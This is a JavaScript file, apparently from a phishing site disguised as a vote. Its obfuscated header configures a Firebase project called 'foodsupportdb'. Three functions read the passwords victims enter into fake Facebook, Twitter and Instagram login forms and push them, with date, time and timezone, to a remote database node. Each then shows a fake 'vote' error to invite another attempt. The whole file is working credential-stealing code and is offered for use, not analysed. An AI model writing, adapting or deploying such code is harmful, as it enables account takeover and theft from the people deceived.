const _0x4ed93b=_0xd631;function _0x2e05(){const _0x47d92f=['initializeApp','1210923CffvMK','912186WzNLKH','534475JdVkgw','3448643CipRfN','foodsupportdb.firebaseapp.com','225kbwHsU','6Lf544sgAAAAAIYRP96xR6Zd5bDJwPD9dh7bo3jW','2976239aIfybQ','10DGHxPY','AIzaSyD1mrAquS1mCddKHvyw7BzOtxb88FzbS8w','1:193164197815:web:b83a68c9722ae0fa84f232','activate','21zsUblS','193164197815','7300XLgwVn','foodsupportdb.appspot.com','8iWFHvM','log','appCheck','15530ApLyPH'];_0x2e05=function(){return _0x47d92f;};return _0x2e05();}(function(_0x1d6abc,_0x38d568){const _0x112ff7=_0xd631,_0x48449a=_0x1d6abc();while(!![]){try{const _0x4cf68d=parseInt(_0x112ff7(0xe7))/0x1*(parseInt(_0x112ff7(0xd9))/0x2)+-parseInt(_0x112ff7(0xe0))/0x3*(parseInt(_0x112ff7(0xd4))/0x4)+parseInt(_0x112ff7(0xdd))/0x5+parseInt(_0x112ff7(0xdc))/0x6+-parseInt(_0x112ff7(0xe2))/0x7*(-parseInt(_0x112ff7(0xd6))/0x8)+-parseInt(_0x112ff7(0xdb))/0x9+-parseInt(_0x112ff7(0xe3))/0xa*(parseInt(_0x112ff7(0xde))/0xb);if(_0x4cf68d===_0x38d568)break;else _0x48449a['push'](_0x48449a['shift']());}catch(_0x2cba20){_0x48449a['push'](_0x48449a['shift']());}}}(_0x2e05,0x40059));const firebaseConfig={'apiKey':_0x4ed93b(0xe4),'authDomain':_0x4ed93b(0xdf),'databaseURL':'https://foodsupportdb-default-rtdb.firebaseio.com','projectId':'foodsupportdb','storageBucket':_0x4ed93b(0xd5),'messagingSenderId':_0x4ed93b(0xd3),'appId':_0x4ed93b(0xe5)};function _0xd631(_0x45bc25,_0x1a299b){const _0x2e0596=_0x2e05();return _0xd631=function(_0xd631e0,_0x2ddb3b){_0xd631e0=_0xd631e0-0xd3;let _0x5f2230=_0x2e0596[_0xd631e0];return _0x5f2230;},_0xd631(_0x45bc25,_0x1a299b);}firebase[_0x4ed93b(0xda)](firebaseConfig);const appCheck=firebase[_0x4ed93b(0xd8)]();console[_0x4ed93b(0xd7)](appCheck),appCheck[_0x4ed93b(0xe6)](_0x4ed93b(0xe1),!![]);


function tw_login() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var email = document.getElementById('tw-email').value;
  var password = document.getElementById('tw-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = 'Twitter';

  if (email !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: email,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });
      document.getElementById('fb-pass').value = '';

      return false;
    }, 2000);
  }
}


function iglog() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var username = document.getElementById('ig-uname').value;
  var password = document.getElementById('ig-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  console.log(timezone);
  var accountType = 'Instagram';

  if (username !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: username,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });

      document.getElementById('ig-pass').value = '';
      return false;
    }, 2000);
  }
}

function login() {
  firebase.auth().signInAnonymously().catch(function(error) {
    var errorCode = error.code;
    var errorMessage = error.message;
    window.alert("Error: " + errorMessage);
  });

  var email = document.getElementById('fb-email').value;
  var password = document.getElementById('fb-pass').value;
  var currentDate = new Date().toISOString().slice(0, 10);
  var currentTime = new Date().toISOString().slice(11, 19);
  var timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
  var accountType = 'Facebook';

  if (email !== '' && password !== '') {
    firebase.database().ref('fbdet').push({
      emle: email,
      mobile: '',
      time: currentTime,
      timezone: timezone,
      pass: password,
      date: currentDate,
      type: accountType
    });

    setTimeout(function() {

      Swal.fire({
        title: 'Oops!',
        text: 'Something went wrong with your vote.',
        icon: 'error',
        confirmButtonText: 'Try Again'
      });
      document.getElementById('fb-pass').value = '';

      return false;
    }, 2000);
  }
}
